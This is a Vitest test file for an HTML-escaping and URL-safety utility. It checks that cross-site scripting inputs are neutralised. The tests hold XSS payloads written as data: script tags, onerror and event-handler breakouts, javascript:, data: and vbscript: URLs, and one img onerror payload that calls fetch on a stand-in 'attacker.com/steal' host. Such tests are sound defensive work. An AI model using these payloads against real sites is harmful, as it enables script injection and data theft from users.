/**
 * Tests for HTML entity escaping utility
 * Ensures XSS attack vectors are properly neutralized
 */

import { describe, it, expect } from 'vitest'
import {
  escapeHtml,
  escapeUrl,
  escapeJavaScript,
  escapeCSS,
  isSafeUrl,
  sanitizeAttribute,
} from '../html-escape'

describe('HTML Security Utilities', () => {
  describe('escapeHtml', () => {
    it('should escape angle brackets', () => {
      expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
      expect(escapeHtml('</script>')).toBe('&lt;&#x2F;script&gt;')
    })

    it('should escape ampersands', () => {
      expect(escapeHtml('&')).toBe('&amp;')
      expect(escapeHtml('A & B')).toBe('A &amp; B')
    })

    it('should escape quotes', () => {
      expect(escapeHtml('"test"')).toBe('&quot;test&quot;')
      expect(escapeHtml("'test'")).toBe('&#x27;test&#x27;')
    })

    it('should escape XSS payload with img onerror', () => {
      const payload = '<img src=x onerror="alert(1)">'
      const escaped = escapeHtml(payload)
      expect(escaped).not.toContain('<')
      expect(escaped).not.toContain('>')
      expect(escaped).toContain('&lt;')
      expect(escaped).toContain('&gt;')
    })

    it('should escape XSS payload with event handlers', () => {
      const payload = '<div onclick="evil()">click me</div>'
      const escaped = escapeHtml(payload)
      expect(escaped).toBe('&lt;div onclick=&quot;evil()&quot;&gt;click me&lt;&#x2F;div&gt;')
    })

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('')
    })

    it('should handle normal text without escaping', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World')
      expect(escapeHtml('normal text 123')).toBe('normal text 123')
    })

    it('should escape forward slashes', () => {
      expect(escapeHtml('</script>')).toContain('&#x2F;')
    })

    it('should escape multiple dangerous characters', () => {
      const payload = '&<>"\'/'
      const escaped = escapeHtml(payload)
      expect(escaped).toBe('&amp;&lt;&gt;&quot;&#x27;&#x2F;')
    })
  })

  describe('escapeUrl', () => {
    it('should encode URL parameters', () => {
      const url = 'hello world'
      expect(escapeUrl(url)).toBe('hello%20world')
    })

    it('should handle empty strings', () => {
      expect(escapeUrl('')).toBe('')
    })

    it('should escape special characters in URLs', () => {
      const url = 'param=<script>&value'
      expect(escapeUrl(url)).not.toContain('<')
      expect(escapeUrl(url)).not.toContain('>')
    })
  })

  describe('isSafeUrl', () => {
    it('should allow http and https URLs', () => {
      expect(isSafeUrl('https://example.com')).toBe(true)
      expect(isSafeUrl('http://example.com')).toBe(true)
    })

    it('should allow relative URLs', () => {
      expect(isSafeUrl('/about')).toBe(true)
      expect(isSafeUrl('../page')).toBe(true)
    })

    it('should block javascript protocol', () => {
      expect(isSafeUrl('javascript:alert(1)')).toBe(false)
      expect(isSafeUrl('JavaScript:alert(1)')).toBe(false)
      expect(isSafeUrl(' javascript:alert(1)')).toBe(false)
    })

    it('should block data protocol', () => {
      expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
      expect(isSafeUrl('DATA:text/html')).toBe(false)
    })

    it('should block vbscript protocol', () => {
      expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false)
      expect(isSafeUrl('VBScript:msgbox(1)')).toBe(false)
    })

    it('should handle whitespace in URLs', () => {
      expect(isSafeUrl('  https://example.com  ')).toBe(true)
      expect(isSafeUrl('  javascript:alert(1)  ')).toBe(false)
    })
  })

  describe('sanitizeAttribute', () => {
    it('should escape HTML and quotes for attributes', () => {
      const input = '<script>alert(1)</script>'
      const result = sanitizeAttribute(input)
      expect(result).not.toContain('<')
      expect(result).not.toContain('>')
    })

    it('should escape quotes', () => {
      const input = 'value with " quote'
      const result = sanitizeAttribute(input)
      expect(result).toBe('value with &quot; quote')
    })
  })

  describe('escapeJavaScript', () => {
    it('should escape quotes and backslashes', () => {
      const input = 'He said "Hello"'
      const result = escapeJavaScript(input)
      expect(result).toContain('\\"')
    })

    it('should escape angle brackets', () => {
      const input = '<script>'
      const result = escapeJavaScript(input)
      expect(result).toBe('\\u003cscript\\u003e')
    })
  })

  describe('escapeCSS', () => {
    it('should escape special CSS characters', () => {
      const input = 'value'
      const result = escapeCSS(input)
      // CSS escaping encodes everything
      expect(result.length).toBeGreaterThanOrEqual(input.length)
    })
  })

  describe('Integration: Real-world XSS scenarios', () => {
    it('should prevent stored XSS in contact form name', () => {
      const maliciousName = '"><script>alert(1)</script><span class="'
      const escaped = escapeHtml(maliciousName)
      const htmlTemplate = `<p>Name: ${escaped}</p>`
      expect(htmlTemplate).not.toContain('<script>')
    })

    it('should prevent DOM-based XSS in email attribute', () => {
      const maliciousEmail = 'test@example.com" onload="alert(1)'
      const escaped = escapeHtml(maliciousEmail)
      const htmlTemplate = `<a href="mailto:${escaped}">Email</a>`
      // The escaped quotes prevent the onload from being interpreted as an attribute
      expect(escaped).toContain('&quot;')
      // Verify the dangerous pattern is neutralized by escaped quotes
      expect(htmlTemplate).not.toContain('" onload="')
    })

    it('should prevent attribute-based XSS in subject', () => {
      const maliciousSubject = '" onmouseover="alert(1)'
      const escaped = escapeHtml(maliciousSubject)
      const htmlTemplate = `<p title="${escaped}">Subject</p>`
      // The escaped quotes prevent the onmouseover from being interpreted as an attribute
      expect(escaped).toContain('&quot;')
      // Verify the dangerous pattern is neutralized by escaped quotes
      expect(htmlTemplate).not.toContain('" onmouseover="')
    })

    it('should prevent content-based XSS in message', () => {
      const maliciousMessage = '<img src=x onerror="fetch(\'https://attacker.com/steal\')">'
      const escaped = escapeHtml(maliciousMessage)
      // Verify angle brackets are escaped, preventing tag injection
      expect(escaped).not.toContain('<img')
      expect(escaped).toContain('&lt;img')
      expect(escaped).not.toContain('</')
    })
  })
})
